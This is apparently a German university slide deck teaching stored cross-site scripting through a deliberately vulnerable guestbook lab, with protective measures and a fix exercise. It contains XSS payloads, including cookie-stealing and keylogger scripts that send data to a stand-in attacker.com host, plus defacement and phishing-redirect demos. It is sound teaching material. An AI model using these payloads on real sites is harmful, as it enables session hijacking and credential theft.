@@ -1,0 +1,642 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Coding - XSS (Cross-Site Scripting)</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reset.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/theme/moon.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/highlight/monokai.css">
+    <style>
+        /* Custom background color */
+        .reveal {
+            background-color: #4B5D67;
+        }
+        .reveal h1, .reveal h2, .reveal h3 { text-transform: none; }
+        .reveal pre { width: 100%; }
+        .reveal code { max-height: 500px; }
+        .slides section { text-align: left; }
+        .slides section h1, .slides section h2 { text-align: center; }
+        .danger { color: #ff6b6b; }
+        .safe { color: #51cf66; }
+        .warning { color: #ffd43b; }
+        .code-small { font-size: 0.5em; }
+        .two-column { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 5px;
+            font-size: 0.7em;
+            font-weight: bold;
+            margin: 5px;
+        }
+        .badge-danger { background: #c92a2a; color: white; }
+        .badge-success { background: #2b8a3e; color: white; }
+        .badge-warning { background: #e67700; color: white; }
+        ul { list-style-type: none; }
+        ul li:before { content: "→ "; color: #51cf66; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- Title Slide -->
+            <section>
+                <h1>Secure Coding</h1>
+                <h2>Cross-Site Scripting (XSS)</h2>
+                <p style="text-align: center; margin-top: 50px;">
+                    <strong>GISH - Grundlagen der IT-Sicherheit</strong><br>
+                    Dauer: 60-90 Minuten
+                </p>
+            </section>
+
+            <!-- Agenda -->
+            <section>
+                <h2>Agenda</h2>
+                <ol>
+                    <li>Einführung in XSS</li>
+                    <li>Das Gästebuch verstehen</li>
+                    <li>Basic XSS Angriffe (4 Demos)</li>
+                    <li>Advanced XSS Angriffe (4 Demos)</li>
+                    <li>Schutzmaßnahmen</li>
+                    <li>Hands-On Übung</li>
+                    <li>Zusammenfassung</li>
+                </ol>
+            </section>
+
+            <!-- Lernziele -->
+            <section>
+                <h2>Lernziele</h2>
+                <p>Nach dieser Übung sollten Sie:</p>
+                <ul>
+                    <li>Die drei Haupttypen von XSS verstehen</li>
+                    <li>Verstehen, wie unsicherer Code zu XSS führt</li>
+                    <li>Unterschied zwischen Sanitierungsmethoden kennen</li>
+                    <li>Reale Angriffsvektoren verstehen</li>
+                    <li>Schutzmaßnahmen implementieren können</li>
+                </ul>
+            </section>
+
+            <!-- Teil 1: Einführung -->
+            <section>
+                <section>
+                    <h2>Teil 1: Was ist XSS?</h2>
+                    <p><strong>Cross-Site Scripting (XSS)</strong> ist eine Sicherheitslücke, bei der Angreifer bösartigen Code (meist JavaScript) in Webanwendungen einschleusen.</p>
+                    <p class="fragment">Der Code wird dann <span class="danger">im Browser anderer Nutzer ausgeführt</span>.</p>
+                </section>
+
+                <section>
+                    <h2>Die drei XSS-Typen</h2>
+                    <div class="two-column">
+                        <div>
+                            <h3 class="danger">1. Stored XSS</h3>
+                            <ul style="font-size: 0.8em;">
+                                <li>Code in DB gespeichert</li>
+                                <li>Bei jedem Aufruf ausgeführt</li>
+                                <li>Betrifft alle Nutzer</li>
+                                <li><strong>Gefährlichste Form!</strong></li>
+                            </ul>
+                        </div>
+                        <div>
+                            <h3 class="warning">2. Reflected XSS</h3>
+                            <ul style="font-size: 0.8em;">
+                                <li>Via URL-Parameter</li>
+                                <li>Sofort zurückgegeben</li>
+                                <li>Nur bei speziellem Link</li>
+                            </ul>
+                            <h3 class="warning" style="margin-top: 20px;">3. DOM-based XSS</h3>
+                            <ul style="font-size: 0.8em;">
+                                <li>Rein client-seitig</li>
+                                <li>Schwer zu erkennen</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <p class="fragment" style="text-align: center; margin-top: 30px;">
+                        <span class="badge badge-danger">Heute fokussieren wir: Stored XSS</span>
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Einfaches Beispiel</h2>
+                    <pre><code class="language-html" data-trim data-line-numbers>
+<!-- Unsicherer Code -->
+&lt;div&gt;&lt;?php echo $_GET['name']; ?&gt;&lt;/div&gt;
+
+<!-- URL: page.php?name=&lt;script&gt;alert('XSS')&lt;/script&gt; -->
+<!-- Resultat: JavaScript wird ausgeführt! -->
+                    </code></pre>
+                    <p class="fragment danger" style="text-align: center; font-size: 1.2em; margin-top: 30px;">
+                        <strong>Frage:</strong> Was passiert hier und warum ist das gefährlich?
+                    </p>
+                </section>
+            </section>
+
+            <!-- Teil 2: Gästebuch verstehen -->
+            <section>
+                <section>
+                    <h2>Teil 2: Das Gästebuch</h2>
+                    <p>Öffnen Sie: <code>http://localhost/guestbook/</code></p>
+                    <p class="fragment">Klicken Sie auf: <strong>"📄 Quellcode anzeigen"</strong></p>
+                </section>
+
+                <section>
+                    <h2>Kritischer Code</h2>
+                    <pre><code class="language-php" data-trim data-line-numbers="1-8|2|3|4|5">
+foreach ($entries as $e) {
+    $msg = strip_tags($e-&gt;getMessage(), '&lt;b&gt;&lt;p&gt;&lt;u&gt;&lt;i&gt;'); // ⚠️ TEILWEISE UNSICHER
+    $author = $e-&gt;getAuthor();                            // ❌ UNSICHER!
+    $email = htmlspecialchars($e-&gt;getEmail());            // ✓ SICHER
+    $date = htmlspecialchars($e-&gt;getEntryDate());         // ✓ SICHER
+
+    echo "&lt;span&gt;$author&lt;/span&gt;";  // ❌ XSS möglich!
+}
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h2>Schlüsselfragen</h2>
+                    <ol>
+                        <li class="fragment">Warum ist <code>$author</code> unsicher?
+                            <p class="fragment safe" style="font-size: 0.8em;">→ Wird NICHT escaped → direktes Einfügen von HTML/JavaScript möglich</p>
+                        </li>
+                        <li class="fragment">Was macht <code>strip_tags()</code>?
+                            <p class="fragment warning" style="font-size: 0.8em;">→ Entfernt Tags, aber NICHT Event-Handler wie onmouseover</p>
+                        </li>
+                        <li class="fragment">Warum ist <code>htmlspecialchars()</code> sicher?
+                            <p class="fragment safe" style="font-size: 0.8em;">→ Wandelt &lt;, &gt;, &amp; in HTML-Entities um → kein JavaScript ausführbar</p>
+                        </li>
+                    </ol>
+                </section>
+            </section>
+
+            <!-- Teil 3: Basic XSS Angriffe -->
+            <section>
+                <section>
+                    <h2>Teil 3: Basic XSS Angriffe</h2>
+                    <p>4 Live-Demos zum Verstehen der Grundlagen</p>
+                </section>
+
+                <section>
+                    <h2>Demo 1: XSS Username</h2>
+                    <span class="badge badge-danger">Stored XSS - Erfolgreich</span>
+                    <pre><code class="language-javascript" data-trim>
+&lt;script&gt;alert('XSS im Namen!');&lt;/script&gt;
+                    </code></pre>
+                    <p><strong>Vorgehensweise:</strong></p>
+                    <ol style="font-size: 0.8em;">
+                        <li>Klick auf "XSS Username" in Demo-Links</li>
+                        <li>Formular wird automatisch gefüllt</li>
+                        <li>Auf "Absenden" klicken</li>
+                        <li class="danger"><strong>Resultat:</strong> Alert-Box erscheint!</li>
+                    </ol>
+                    <p class="fragment danger" style="text-align: center; margin-top: 20px;">
+                        <strong>Wer ist betroffen?</strong> Alle Nutzer, die die Seite aufrufen!
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Demo 2: XSS Message (OK)</h2>
+                    <span class="badge badge-success">Verhindert - strip_tags() funktioniert</span>
+                    <pre><code class="language-javascript" data-trim>
+// Eingefügter Code:
+&lt;script&gt;alert('XSS');&lt;/script&gt;
+
+// Nach strip_tags():
+alert('XSS');  // &lt;script&gt;-Tag entfernt!
+                    </code></pre>
+                    <p class="fragment safe"><strong>Aber:</strong> Ist das ausreichend Schutz? → Nächste Demo...</p>
+                </section>
+
+                <section>
+                    <h2>Demo 3: XSS Message (FAIL)</h2>
+                    <span class="badge badge-danger">Stored XSS - Erfolgreich</span>
+                    <pre><code class="language-html" data-trim>
+&lt;u onmouseover="javascript:alert('XSS via Event-Handler!');"&gt;
+    Fahre mit der Maus über diesen Text!
+&lt;/u&gt;
+                    </code></pre>
+                    <div class="fragment">
+                        <p><strong>Warum funktioniert das?</strong></p>
+                        <ul style="font-size: 0.8em;">
+                            <li><code>&lt;u&gt;</code>-Tag ist in der Whitelist erlaubt</li>
+                            <li><code>strip_tags()</code> entfernt nur Tags, NICHT Attribute!</li>
+                            <li>Event-Handler wie <code>onmouseover</code> bleiben erhalten</li>
+                        </ul>
+                    </div>
+                    <p class="fragment danger" style="text-align: center;">
+                        <strong>strip_tags() ist unzureichend!</strong>
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Demo 4: htmlspecialchars is safe</h2>
+                    <span class="badge badge-success">Verhindert - Sicher!</span>
+                    <pre><code class="language-php" data-trim>
+// Eingefügter Code im Email-Feld:
+&lt;script&gt;alert('XSS');&lt;/script&gt;
+
+// Nach htmlspecialchars():
+&amp;lt;script&amp;gt;alert('XSS');&amp;lt;/script&amp;gt;
+
+// Im Browser: Als Text angezeigt, nicht ausgeführt
+                    </code></pre>
+                    <p class="fragment safe" style="text-align: center; font-size: 1.2em; margin-top: 30px;">
+                        <strong>Dies ist die empfohlene Methode!</strong>
+                    </p>
+                </section>
+            </section>
+
+            <!-- Teil 4: Advanced XSS Angriffe -->
+            <section>
+                <section>
+                    <h2>Teil 4: Advanced XSS</h2>
+                    <p>Reale Angriffsszenarien</p>
+                    <span class="badge badge-danger">Sehr gefährlich!</span>
+                </section>
+
+                <section>
+                    <h2>Demo 5: Cookie Stealing</h2>
+                    <span class="badge badge-danger">Session Hijacking möglich</span>
+                    <pre><code class="language-javascript" data-trim data-line-numbers="1-7|3|6">
+&lt;script&gt;
+    // Demo: Zeigt Cookies
+    alert('Cookies: ' + document.cookie);
+
+    // In einem echten Angriff:
+    fetch('http://attacker.com/steal.php?c=' + document.cookie);
+&lt;/script&gt;
+                    </code></pre>
+                    <div class="fragment">
+                        <p><strong>Was steht in Cookies?</strong></p>
+                        <ul style="font-size: 0.8em;">
+                            <li>Session-IDs</li>
+                            <li>Authentication Tokens</li>
+                            <li>Persönliche Einstellungen</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Cookie Stealing - Szenario</h2>
+                    <ol style="font-size: 0.9em;">
+                        <li>Angreifer fügt Cookie-Stealing Code ins Gästebuch ein</li>
+                        <li class="fragment">Admin oder andere Nutzer besuchen die Seite</li>
+                        <li class="fragment">Ihre Session-Cookies werden gestohlen</li>
+                        <li class="fragment danger">Angreifer kann sich als diese Nutzer ausgeben!</li>
+                    </ol>
+                    <p class="fragment safe" style="margin-top: 30px;">
+                        <strong>Schutz:</strong> <code>HttpOnly</code> Flag bei Cookies setzen
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Demo 6: Defacement</h2>
+                    <span class="badge badge-danger">Seite überschreiben</span>
+                    <pre><code class="language-javascript" data-trim>
+&lt;script&gt;
+setTimeout(function() {
+    document.body.innerHTML = '&lt;div&gt;DEFACED!&lt;/div&gt;';
+}, 5000);  // 5 Sekunden Verzögerung
+&lt;/script&gt;
+                    </code></pre>
+                    <div class="fragment">
+                        <p><strong>Reale Beispiele:</strong></p>
+                        <ul style="font-size: 0.8em;">
+                            <li>Politischer Aktivismus (Website-Defacement)</li>
+                            <li>Phishing (gefälschte Login-Formulare)</li>
+                            <li>Malware-Verteilung</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Demo 7: Keylogger</h2>
+                    <span class="badge badge-danger">Extrem gefährlich</span>
+                    <pre><code class="language-javascript" data-trim data-line-numbers="1-12|2|3-11|8-9">
+&lt;script&gt;
+var keys = [];
+document.addEventListener('keypress', function(e) {
+    if (e.target.id === 'keyloggerDemo') {
+        keys.push(e.key);
+
+        if (keys.length &gt;= 20) {
+            // In einem echten Angriff:
+            fetch('http://attacker.com/log.php?keys=' + keys.join(''));
+            keys = [];
+        }
+    }
+});
+&lt;/script&gt;
+                    </code></pre>
+                    <p class="fragment danger" style="font-size: 0.9em;">
+                        <strong>Was wird aufgezeichnet?</strong> Passwörter, Kreditkartennummern, PINs...
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Demo 8: Redirect (Phishing)</h2>
+                    <span class="badge badge-danger">Klassischer Phishing-Vektor</span>
+                    <pre><code class="language-javascript" data-trim>
+&lt;script&gt;
+setTimeout(function() {
+    // In einem echten Angriff:
+    window.location.href = 'http://fake-bank-login.com';
+}, 3000);
+&lt;/script&gt;
+                    </code></pre>
+                    <div class="fragment">
+                        <p><strong>Phishing-Szenario:</strong></p>
+                        <ol style="font-size: 0.8em;">
+                            <li>User besucht legitime Bank-Website</li>
+                            <li>XSS leitet nach 3 Sekunden zu fake-bank.com um</li>
+                            <li>Gefälschte Login-Seite sieht identisch aus</li>
+                            <li class="danger">User gibt Credentials ein → Angreifer hat sie</li>
+                        </ol>
+                    </div>
+                </section>
+            </section>
+
+            <!-- Teil 5: Schutzmaßnahmen -->
+            <section>
+                <section>
+                    <h2>Teil 5: Schutzmaßnahmen</h2>
+                    <p>Wie schützen wir uns gegen XSS?</p>
+                </section>
+
+                <section>
+                    <h2>1. Output Encoding</h2>
+                    <span class="badge badge-success">Wichtigste Maßnahme!</span>
+                    <pre><code class="language-php" data-trim>
+// ❌ UNSICHER
+echo "&lt;div&gt;" . $userInput . "&lt;/div&gt;";
+
+// ✓ SICHER
+echo "&lt;div&gt;" . htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8') . "&lt;/div&gt;";
+                    </code></pre>
+                    <p><strong>Parameter:</strong></p>
+                    <ul style="font-size: 0.8em;">
+                        <li><code>ENT_QUOTES</code>: Escaped auch einfache und doppelte Anführungszeichen</li>
+                        <li><code>'UTF-8'</code>: Wichtig für korrekte Encoding</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>2. Input Validation</h2>
+                    <pre><code class="language-php" data-trim>
+// Email validieren
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    die("Ungültige Email");
+}
+
+// Nur bestimmte Zeichen erlauben
+if (!preg_match('/^[a-zA-Z0-9\s]+$/', $name)) {
+    die("Name enthält ungültige Zeichen");
+}
+                    </code></pre>
+                    <p class="warning" style="text-align: center; margin-top: 20px;">
+                        <strong>Achtung:</strong> Validation alleine reicht NICHT!<br>
+                        Immer auch Output Encoding!
+                    </p>
+                </section>
+
+                <section>
+                    <h2>3. Content Security Policy (CSP)</h2>
+                    <pre><code class="language-php" data-trim>
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+                    </code></pre>
+                    <p><strong>Verhindert:</strong></p>
+                    <ul style="font-size: 0.8em;">
+                        <li>Inline-JavaScript (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>)</li>
+                        <li>External Scripts von fremden Domains</li>
+                        <li>Event-Handler (<code>onmouseover=...</code>)</li>
+                    </ul>
+                    <p class="safe" style="margin-top: 20px;">
+                        <strong>Defense-in-Depth:</strong> Auch wenn XSS durchkommt, wird es nicht ausgeführt!
+                    </p>
+                </section>
+
+                <section>
+                    <h2>4. HttpOnly & Secure Cookies</h2>
+                    <pre><code class="language-php" data-trim>
+setcookie(
+    'session',
+    $sessionId,
+    [
+        'httponly' =&gt; true,  // JavaScript kann nicht darauf zugreifen
+        'secure' =&gt; true,    // Nur über HTTPS
+        'samesite' =&gt; 'Strict'  // CSRF-Schutz
+    ]
+);
+                    </code></pre>
+                </section>
+
+                <section>
+                    <h2>5. Framework-Features nutzen</h2>
+                    <p>Moderne Frameworks haben eingebauten XSS-Schutz:</p>
+                    <ul style="font-size: 0.9em;">
+                        <li><strong>React:</strong> Escaped standardmäßig</li>
+                        <li><strong>Vue.js:</strong> <code>{{ }}</code> escaped automatisch</li>
+                        <li><strong>Angular:</strong> Sanitization eingebaut</li>
+                        <li><strong>Laravel/Symfony:</strong> Blade/Twig escapen automatisch</li>
+                    </ul>
+                    <p class="warning" style="margin-top: 30px;">
+                        <strong>Aber:</strong> Bei <code>dangerouslySetInnerHTML</code> (React) oder <code>v-html</code> (Vue) aufpassen!
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Defense-in-Depth Strategie</h2>
+                    <div style="text-align: center;">
+                        <div style="background: #2b8a3e; color: white; padding: 15px; margin: 10px; border-radius: 5px;">
+                            1. Output Encoding (htmlspecialchars)
+                        </div>
+                        <div style="font-size: 2em;">+</div>
+                        <div style="background: #2b8a3e; color: white; padding: 15px; margin: 10px; border-radius: 5px;">
+                            2. Content Security Policy
+                        </div>
+                        <div style="font-size: 2em;">+</div>
+                        <div style="background: #2b8a3e; color: white; padding: 15px; margin: 10px; border-radius: 5px;">
+                            3. HttpOnly Cookies
+                        </div>
+                        <div style="font-size: 2em;">=</div>
+                        <div style="background: #1971c2; color: white; padding: 20px; margin: 10px; border-radius: 5px; font-size: 1.2em;">
+                            <strong>Mehrschichtiger Schutz</strong>
+                        </div>
+                    </div>
+                </section>
+            </section>
+
+            <!-- Teil 6: Hands-On -->
+            <section>
+                <section>
+                    <h2>Teil 6: Hands-On Übung</h2>
+                    <h3 class="safe">Fixen Sie das Gästebuch!</h3>
+                </section>
+
+                <section>
+                    <h2>Ihre Aufgabe</h2>
+                    <ol>
+                        <li>Öffnen Sie <code>/var/www/html/guestbook/index.php</code></li>
+                        <li>Finden Sie die unsichere Zeile (ca. Zeile 42)</li>
+                        <li>Fixen Sie den Code, sodass XSS im Namen-Feld nicht mehr funktioniert</li>
+                    </ol>
+                    <p style="margin-top: 50px; text-align: center;">
+                        <strong>Zeit:</strong> 15-20 Minuten
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Lösung</h2>
+                    <pre><code class="language-php" data-trim data-line-numbers="1-5|2|5">
+// Vorher (UNSICHER):
+$author = $e-&gt;getAuthor();
+
+// Nachher (SICHER):
+$author = htmlspecialchars($e-&gt;getAuthor(), ENT_QUOTES, 'UTF-8');
+                    </code></pre>
+                    <div class="fragment">
+                        <p><strong>Testen:</strong></p>
+                        <ol style="font-size: 0.8em;">
+                            <li>Datei speichern</li>
+                            <li>"Angriffsdaten löschen" klicken</li>
+                            <li>"XSS Username" erneut probieren</li>
+                            <li class="safe"><strong>Resultat:</strong> Kein Alert mehr → Erfolg! ✓</li>
+                        </ol>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Bonus-Aufgaben</h2>
+                    <p>Für fortgeschrittene Studierende:</p>
+                    <ol style="font-size: 0.9em;">
+                        <li>Implementieren Sie CSP-Header</li>
+                        <li>Setzen Sie HttpOnly-Cookies</li>
+                        <li>Ersetzen Sie <code>strip_tags()</code> durch <code>htmlspecialchars()</code></li>
+                        <li>Fügen Sie Input-Validation für den Namen hinzu</li>
+                    </ol>
+                </section>
+            </section>
+
+            <!-- Teil 7: Zusammenfassung -->
+            <section>
+                <section>
+                    <h2>Teil 7: Zusammenfassung</h2>
+                </section>
+
+                <section>
+                    <h2>Key Takeaways</h2>
+                    <ol>
+                        <li class="fragment"><strong>XSS ist eine der häufigsten Schwachstellen</strong> (OWASP Top 10)</li>
+                        <li class="fragment"><strong>Stored XSS ist am gefährlichsten</strong> (betrifft alle Nutzer)</li>
+                        <li class="fragment"><strong>htmlspecialchars() ist die Lösung</strong>, nicht strip_tags()</li>
+                        <li class="fragment"><strong>XSS ermöglicht viele Angriffe:</strong> Cookie-Stealing, Defacement, Keylogging, Phishing</li>
+                        <li class="fragment"><strong>Defense-in-Depth:</strong> Mehrere Schutzschichten kombinieren</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h2>OWASP Top 10 Kontext</h2>
+                    <p>XSS war lange Zeit <strong>#3</strong> in den OWASP Top 10.</p>
+                    <p class="fragment">Ab 2021 wurde es in <strong>A03:2021 – Injection</strong> integriert.</p>
+                    <div class="fragment" style="margin-top: 30px;">
+                        <p><strong>Verwandte Angriffe:</strong></p>
+                        <ul style="font-size: 0.9em;">
+                            <li>SQL Injection (A03)</li>
+                            <li>Command Injection (A03)</li>
+                            <li>LDAP Injection (A03)</li>
+                        </ul>
+                    </div>
+                    <p class="fragment danger" style="text-align: center; margin-top: 30px; font-size: 1.2em;">
+                        <strong>Alle haben dieselbe Ursache: Unsanitierte Nutzereingaben!</strong>
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Diskussionsfragen</h2>
+                    <ol>
+                        <li class="fragment">Warum reicht HTTPS alleine nicht gegen XSS?</li>
+                        <li class="fragment">Kann ein Antivirus XSS-Angriffe verhindern?</li>
+                        <li class="fragment">Warum sollte man niemals Nutzereingaben vertrauen?</li>
+                        <li class="fragment">Welche anderen Angriffe werden durch XSS ermöglicht?</li>
+                    </ol>
+                </section>
+
+                <section>
+                    <h2>Häufige Missverständnisse</h2>
+                    <ul style="font-size: 0.9em;">
+                        <li class="fragment danger"><strong>"HTTPS schützt gegen XSS"</strong><br>
+                            → Nein! HTTPS schützt nur die Übertragung</li>
+                        <li class="fragment danger"><strong>"Antivirus erkennt XSS"</strong><br>
+                            → Nein! Es ist kein Virus, sondern eine Schwachstelle</li>
+                        <li class="fragment danger"><strong>"Input Validation reicht"</strong><br>
+                            → Nein! Immer auch Output Encoding!</li>
+                        <li class="fragment danger"><strong>"strip_tags() ist sicher"</strong><br>
+                            → Nein! Event-Handler bleiben erhalten</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h2>Weiterführende Ressourcen</h2>
+                    <ul style="font-size: 0.85em;">
+                        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Cheat Sheet</a></li>
+                        <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger Web Security Academy - XSS</a></li>
+                        <li><a href="https://xss-game.appspot.com/" target="_blank">Google XSS Game</a></li>
+                    </ul>
+                    <div style="margin-top: 40px;">
+                        <p><strong>Hausaufgabe:</strong></p>
+                        <p style="font-size: 0.85em;">Recherchieren Sie einen realen XSS-Angriff:<br>
+                        Twitter XSS Worm (2010), British Airways (2018), eBay (2014), MySpace Samy Worm (2005)</p>
+                    </div>
+                </section>
+
+                <section>
+                    <h2>Bekannte XSS-Angriffe</h2>
+                    <ul style="font-size: 0.85em;">
+                        <li><strong>MySpace Samy Worm (2005)</strong><br>
+                            1 Million Freundschaftsanfragen in 20 Stunden</li>
+                        <li><strong>Twitter XSS Worm (2010)</strong><br>
+                            "Mikko's Tweet" - Onmouseover XSS</li>
+                        <li><strong>eBay XSS (2014)</strong><br>
+                            Persistent XSS in Produktbeschreibungen</li>
+                        <li><strong>British Airways (2018)</strong><br>
+                            380.000 Kreditkarten gestohlen via Magecart XSS</li>
+                    </ul>
+                </section>
+
+                <section>
+                    <h1>Vielen Dank!</h1>
+                    <p style="text-align: center; margin-top: 50px;">
+                        <strong>Fragen?</strong>
+                    </p>
+                    <p style="text-align: center; margin-top: 50px; font-size: 0.8em;">
+                        GISH - Grundlagen der IT-Sicherheit<br>
+                        Secure Coding: Cross-Site Scripting (XSS)
+                    </p>
+                </section>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/dist/reveal.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/notes/notes.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/markdown/markdown.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.6.0/plugin/highlight/highlight.js"></script>
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: true,
+            transition: 'slide',
+            backgroundTransition: 'fade',
+            plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ],
+            width: 1280,
+            height: 720,
+            margin: 0.1,
+            minScale: 0.2,
+            maxScale: 2.0
+        });
+    </script>
+</body>
+</html>
